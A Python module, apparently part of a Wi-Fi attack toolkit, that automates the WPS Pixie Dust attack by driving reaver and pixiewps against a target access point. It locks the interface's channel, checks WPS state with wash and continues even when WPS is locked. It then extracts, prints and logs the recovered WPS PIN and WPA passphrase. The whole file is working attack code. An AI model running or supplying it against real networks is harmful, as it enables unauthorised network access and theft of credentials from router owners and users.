# pixie_dust.py — WPS Pixie Dust attack via reaver + pixiewps
import os
import shutil
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from logger import logger
from config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET


@dataclass
class PixieDustResult:
    bssid: str = ""
    ssid: str = ""
    channel: int = 0
    pin: str = ""
    psk: str = ""
    elapsed: float = 0.0
    raw_output: str = ""


class PixieDustAttack:
    def __init__(self, interface, target_bssid, target_channel, target_ssid="Unknown", timeout=120):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.target_ssid = target_ssid
        self.timeout = timeout

        self._process = None
        self._stop_event = threading.Event()
        self._output_lines = []

    def check_dependencies(self):
        missing = []
        if not shutil.which("reaver"):
            missing.append("reaver")
        if not shutil.which("pixiewps"):
            missing.append("pixiewps")
        return (len(missing) == 0, missing)

    def stop(self):
        self._stop_event.set()
        self._kill_reaver()

    def _kill_reaver(self):
        proc = self._process
        if proc is None or proc.poll() is not None:
            return
        try:
            if os.name != "nt":
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
        except Exception:
            pass
        # Give it a moment, then SIGKILL if still alive
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            try:
                if os.name != "nt":
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                else:
                    proc.kill()
                proc.wait(timeout=2)
            except Exception:
                pass
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    def _lock_channel(self):
        """Lock the wireless interface to the target channel."""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(self.target_channel)],
                capture_output=True, timeout=3
            )
        except Exception:
            pass  # non-fatal, reaver will try too

    def _check_wps_with_wash(self):
        if not shutil.which("wash"):
            return None
        try:
            proc = subprocess.run(
                ["wash", "-i", self.interface, "-b", self.target_bssid,
                 "-c", str(self.target_channel)],
                capture_output=True, text=True, timeout=15,
                stdin=subprocess.DEVNULL
            )
            output = proc.stdout.lower() + proc.stderr.lower()

            # Check for "WPS Locked: Yes" or just the words
            if "wps locked" in output:
                return "locked"
            if self.target_bssid.lower() in output:
                return "available"
            return "not_found"
        except FileNotFoundError:
            logger.debug("wash not found, skipping WPS check")
            return None
        except subprocess.TimeoutExpired:
            logger.debug("wash check timed out")
            return None
        except Exception as e:
            logger.debug(f"wash check failed: {e}")
            return None

    def _parse_line(self, line, result):
        stripped = line.strip()
        self._output_lines.append(stripped)

        # --- WPS PIN ---
        if "WPS PIN:" in stripped:
            try:
                pin_part = stripped.split("WPS PIN:")[-1].strip()
                pin = pin_part.split()[0] if pin_part else ""
                if pin:
                    result.pin = pin
                    print(f"\n{C_GREEN}[+] WPS PIN Found: {pin}{C_RESET}")
            except Exception:
                pass

        # --- WPA PSK ---
        if "WPA PSK:" in stripped:
            try:
                psk_part = stripped.split("WPA PSK:")[-1].strip()
                psk = psk_part.split()[0] if psk_part else ""
                if psk:
                    result.psk = psk
                    print(f"{C_GREEN}[+] WPA PSK Found: {psk}{C_RESET}")
            except Exception:
                pass

        # Show informative lines
        for keyword in ("PKR", "E-S1", "E-S2", "Pixie Dust", "pixiewps",
                        "[P]", "[+]", "WPS PIN", "WPA PSK",
                        "Sending:", "Received:"):
            if keyword.lower() in stripped.lower():
                print(f"    {C_CYAN}{stripped}{C_RESET}")
                break

        # Warnings / errors
        if "WPS version not supported" in stripped:
            print(f"\n{C_RED}[-] Target does not support WPS{C_RESET}")
        if "not vulnerable" in stripped.lower() or "no PKE" in stripped:
            print(f"\n{C_YELLOW}[!] Target may not be vulnerable to Pixie Dust{C_RESET}")
        if "WPS Locked" in stripped:
            print(f"\n{C_RED}[-] WPS is locked on this target (too many failed attempts){C_RESET}")
        if "Recurring Timeout" in stripped or "10 attempts" in stripped:
            print(f"\n{C_YELLOW}[!] WPS rate-limited by target{C_RESET}")
        if "No valid WPS" in stripped:
            print(f"\n{C_YELLOW}[!] No valid WPS handshake captured, retrying...{C_RESET}")

    def _read_output_thread(self, process, result):
        """Background thread: drain reaver stdout so the process doesn't block on pipe buffer."""
        try:
            for line in process.stdout:
                if self._stop_event.is_set():
                    break
                self._parse_line(line, result)
        except ValueError:
            # stdout closed
            pass
        except Exception as e:
            logger.debug(f"Output reader error: {e}")

    def run(self):
        start_time = time.time()
        result = PixieDustResult(
            bssid=self.target_bssid,
            ssid=self.target_ssid,
            channel=self.target_channel
        )

        # 1. Check dependencies
        ok, missing = self.check_dependencies()
        if not ok:
            print(f"{C_RED}[!] Missing dependencies: {', '.join(missing)}{C_RESET}")
            print(f"{C_YELLOW}    Install: sudo apt-get install {' '.join(missing)}{C_RESET}")
            logger.error(f"Pixie Dust missing deps: {missing}")
            return None

        # 2. Lock channel
        print(f"{C_CYAN}[*] Locking interface to channel {self.target_channel}...{C_RESET}")
        self._lock_channel()

        # 3. Run wash check (optional)
        print(f"{C_CYAN}[*] Running WPS wash check...{C_RESET}")
        wash_status = self._check_wps_with_wash()
        if wash_status == "locked":
            print(f"{C_RED}[!] WPS is locked on this target{C_RESET}")
            print(f"{C_YELLOW}[*] Continuing anyway (lock may be temporary)...{C_RESET}")
        elif wash_status == "not_found":
            print(f"{C_YELLOW}[!] Target not found by wash. WPS may not be enabled.{C_RESET}")
        elif wash_status is None:
            print(f"{C_YELLOW}[*] wash not available, skipping WPS check{C_RESET}")

        # 4. Start reaver with timeout monitor
        print(f"\n{C_CYAN}[*] Starting Pixie Dust Attack on {self.target_bssid}{C_RESET}")
        print(f"{C_CYAN}    Channel: {self.target_channel} | Timeout: {self.timeout}s{C_RESET}")
        print(f"{C_YELLOW}[*] Launching reaver...{C_RESET}\n")

        output_file = f"/tmp/pixie_dust_{self.target_bssid.replace(':', '-')}_{int(time.time())}.out"

        reaver_cmd = [
            "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "-c", str(self.target_channel),
            "-K", "1",       # pixiewps mode
            "-vv",           # verbose
            "-f",            # fixed channel
            "-o", output_file
        ]

        try:
            self._process = subprocess.Popen(
                reaver_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                universal_newlines=True,
                preexec_fn=os.setsid if os.name != "nt" else None
            )
            logger.info(f"Reaver started (PID {self._process.pid})")

            # Start a background reader thread to consume output without blocking
            reader = threading.Thread(
                target=self._read_output_thread,
                args=(self._process, result),
                daemon=True
            )
            reader.start()

            # Monitor thread: enforce timeout
            timeout_monitor = threading.Thread(
                target=lambda: (
                    self._stop_event.wait(self.timeout),
                    self._kill_reaver() if self._stop_event.is_set() else None
                ),
                daemon=True
            )
            timeout_monitor.start()

            # Wait for reaver to finish or be killed
            # Poll in a loop so we catch stop_event even if reader is idle
            while True:
                if self._stop_event.is_set():
                    self._kill_reaver()
                    break

                # Check if process has exited
                try:
                    self._process.wait(timeout=0.5)
                    break  # exited on its own
                except subprocess.TimeoutExpired:
                    continue

        except FileNotFoundError:
            print(f"{C_RED}[!] reaver binary not found. Install: sudo apt-get install reaver{C_RESET}")
            logger.error("reaver binary not found")
            return None
        except Exception as e:
            logger.error(f"Reaver execution error: {e}")
            print(f"{C_RED}[!] Error running reaver: {e}{C_RESET}")
            self._kill_reaver()
        finally:
            # Make sure everything is stopped
            self._kill_reaver()
            # Give reader thread a moment to finish
            if reader.is_alive():
                reader.join(timeout=2)

        result.elapsed = time.time() - start_time
        result.raw_output = "\n".join(self._output_lines)

        # 5. Report results
        if result.pin and result.psk:
            print(f"\n{C_GREEN}{'='*50}{C_RESET}")
            print(f"{C_GREEN}        PIXIE DUST ATTACK SUCCESS{C_RESET}")
            print(f"{C_GREEN}{'='*50}{C_RESET}")
            print(f"  BSSID    : {C_WHITE}{result.bssid}{C_RESET}")
            print(f"  SSID     : {C_CYAN}{result.ssid}{C_RESET}")
            print(f"  Channel  : {C_YELLOW}{result.channel}{C_RESET}")
            print(f"  WPS PIN  : {C_GREEN}{result.pin}{C_RESET}")
            print(f"  WPA PSK  : {C_GREEN}{result.psk}{C_RESET}")
            print(f"  Time     : {result.elapsed:.1f}s")
            print(f"{C_GREEN}{'='*50}{C_RESET}")
            logger.info(f"Pixie Dust success: PIN={result.pin}, PSK={result.psk}")

            # Keep the output file on success
            try:
                if os.path.exists(output_file):
                    debug_path = f"pixie_dust_{self.target_bssid.replace(':', '-')}.out"
                    shutil.move(output_file, debug_path)
                    print(f"{C_CYAN}  Log file: {debug_path}{C_RESET}")
            except Exception:
                pass

            return result

        if result.pin:
            print(f"\n{C_YELLOW}[!] PIN recovered but PSK derivation failed{C_RESET}")
            print(f"{C_YELLOW}    PIN: {result.pin}{C_RESET}")
            print(f"{C_YELLOW}    Try connecting with PIN manually via WPS{C_RESET}")
            logger.info(f"Pixie Dust partial: PIN={result.pin}, no PSK")

            # Keep the output on partial success too
            try:
                if os.path.exists(output_file):
                    debug_path = f"pixie_dust_{self.target_bssid.replace(':', '-')}.out"
                    shutil.move(output_file, debug_path)
                    print(f"{C_CYAN}  Log file: {debug_path}{C_RESET}")
            except Exception:
                pass

            return result

        # Clean up output file on complete failure
        print(f"\n{C_RED}[-] Pixie Dust attack failed{C_RESET}")
        if self._stop_event.is_set() and result.elapsed >= self.timeout:
            print(f"{C_YELLOW}    Reason: Timed out after {self.timeout}s{C_RESET}")
        elif self._stop_event.is_set():
            print(f"{C_YELLOW}    Reason: Interrupted{C_RESET}")
        else:
            print(f"{C_RED}    Target may not be vulnerable to this attack{C_RESET}")
            print(f"{C_YELLOW}    Possible reasons:{C_RESET}")
            print(f"{C_YELLOW}    - Target uses non-vulnerable WPS implementation{C_RESET}")
            print(f"{C_YELLOW}    - WPS is disabled on the target{C_RESET}")
            print(f"{C_YELLOW}    - Signal quality too poor for WPS exchange{C_RESET}")
            print(f"{C_YELLOW}    - reaver/pixiewps version mismatch{C_RESET}")

            # Save raw output for debugging on failure (only if there was any output)
            if self._output_lines:
                try:
                    debug_path = f"pixie_dust_debug_{self.target_bssid.replace(':', '-')}.out"
                    with open(debug_path, "w") as f:
                        f.write(result.raw_output)
                    print(f"{C_YELLOW}    Debug output saved to: {debug_path}{C_RESET}")
                except Exception:
                    pass

        # Delete temp file
        try:
            if os.path.exists(output_file):
                os.remove(output_file)
        except OSError:
            pass

        logger.info(f"Pixie Dust failed for {self.target_bssid}")
        return None
